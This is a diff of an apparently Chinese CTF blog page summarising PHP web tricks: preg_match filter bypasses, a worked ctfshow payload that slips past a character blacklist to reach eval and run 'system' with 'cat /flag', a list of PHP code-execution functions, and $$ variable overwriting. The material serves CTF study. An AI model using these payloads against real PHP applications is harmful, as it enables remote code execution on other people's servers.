@@ -186,7 +186,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      532 字
+      926 字
     </span>
   
 
@@ -196,7 +196,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      13
        分钟
     </span>
   
@@ -238,7 +238,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：3 分钟前
+                  本文最后更新于：11 分钟前
                 
               </p>
             
@@ -265,12 +265,53 @@
 <h1 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h1><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>正则绕过在ctf比赛中还是比较常见.绕过手法也比较多,最常见的是使用 取反在<code>urlencode</code>绕过</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> urlencode(~<span class="hljs-string">&quot;getFlag&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/v01cano/p/11736722.html">https://www.cnblogs.com/v01cano/p/11736722.html</a></p>
+<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><h3 id="奇形怪状"><a href="#奇形怪状" class="headerlink" title="奇形怪状"></a>奇形怪状</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$ctfshow</span>) || strlen(<span class="hljs-variable">$ctfshow</span>) &lt;= <span class="hljs-number">107</span>) &#123;<br>       <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="hljs-variable">$ctfshow</span>))&#123;<br>           <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ctfshow</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里简述一下绕过方式</p>
+<p>从过滤字符中找到:  <code>_</code> <code>&#123;</code>  <code>&#125;</code> <code>[</code> <code>]</code> <code>1</code> <code>2</code> <code>3</code> <code>0</code> <code>C</code> <code>+</code> <code>-</code>  等</p>
+<p>构造payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf_show=%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>DC%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>C%<span class="hljs-number">3</span>D%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>C_%<span class="hljs-number">3</span>D%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D(C%<span class="hljs-number">2</span>FC.C)%<span class="hljs-number">7</span>B0%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D_.%<span class="hljs-number">24</span>C_.%<span class="hljs-number">24</span>C.%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B(%<span class="hljs-number">24</span>%<span class="hljs-number">24</span>_%<span class="hljs-number">7</span>B1%<span class="hljs-number">7</span>D)(%<span class="hljs-number">24</span>%<span class="hljs-number">24</span>_%<span class="hljs-number">7</span>B2%<span class="hljs-number">7</span>D)%<span class="hljs-number">3</span>B<br><span class="hljs-comment">// ctf_show = $_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;($$_&#123;1&#125;)($$_&#123;2&#125;);</span><br></code></pre></td></tr></table></figure>
+
+<p>配合 <code>get</code>传参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=cat /flag<br></code></pre></td></tr></table></figure>
+
+<p>完成绕过,执行<code>eval</code></p>
+<p><strong>payload 解析</strong></p>
+<p>遇到 <code>_</code>没有被过滤,可以 思考将<code>_</code>定义为变量名.在结合<code>C</code>,可以组合为两种变量名.</p>
+<p>其次,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> C/C;<br><span class="hljs-comment"># 返回结果为   NAN</span><br></code></pre></td></tr></table></figure>
+
+<p>以后可以通过<code>C/C</code>配合<code>+</code>构建新字符.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=a<br></code></pre></td></tr></table></figure>
+
+<p>另外,这样赋值,php会给出警告并将<code>a</code>当作<code>&#39;a&#39;</code>赋值给<code>_</code></p>
+<p>最后便是一个利用<code>$$</code>进行变量覆盖</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;_GET&#x27;</span>;<br><span class="hljs-variable">$$a</span>&#123;<span class="hljs-number">1</span>&#125; == <span class="hljs-variable">$$a</span>[<span class="hljs-number">1</span>] == <span class="hljs-variable">$$a</span>[<span class="hljs-string">&#x27;1&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/v01cano/p/11736722.html">https://www.cnblogs.com/v01cano/p/11736722.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
 <h1 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h1><h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><a href="/2021/08/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Greatphp/" title="极客大挑战2020Greatphp">极客大挑战2020Greatphp</a>
 
 <h5 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h5><p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/10/Web%E5%AE%89%E5%85%A8/PHP%20%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93/">https://whoamianony.top/2021/03/10/Web%E5%AE%89%E5%85%A8/PHP%20%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93/</a></p>
 <p><a target="_blank" rel="noopener" href="https://troyess.com/2021/03/29/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">https://troyess.com/2021/03/29/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p>
+<h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><p>这里对 <code>php代码执行函数</code>做一个总结,可以在<code>phpinfo</code>中观察<code>disablefunction</code>是否有漏网之鱼</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">passthru;<br><span class="hljs-keyword">eval</span>;<br>system;<br>assert;<br>proc_open;<br><br>... 持续完善中<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h3 id="双刀ner变量覆盖"><a href="#双刀ner变量覆盖" class="headerlink" title="$$ 双刀ner变量覆盖"></a>$$ 双刀ner变量覆盖</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;_GET&#x27;</span>;<br><span class="hljs-variable">$$a</span>&#123;<span class="hljs-number">1</span>&#125; == <span class="hljs-variable">$$a</span>[<span class="hljs-number">1</span>] == <span class="hljs-variable">$$a</span>[<span class="hljs-string">&#x27;1&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract 变量覆盖"></a>extract 变量覆盖</h3><p>持续完善中…</p>
 
             </div>
             <hr>
@@ -290,9 +331,9 @@
                     
                       <a class="hover-with-bg" href="/tags/php/">php</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%80%BB%E7%BB%93/">总结</a>
-                    
                       <a class="hover-with-bg" href="/tags/bypass/">bypass</a>
+                    
+                      <a class="hover-with-bg" href="/tags/summary/">summary</a>
                     
                   </div>
                 
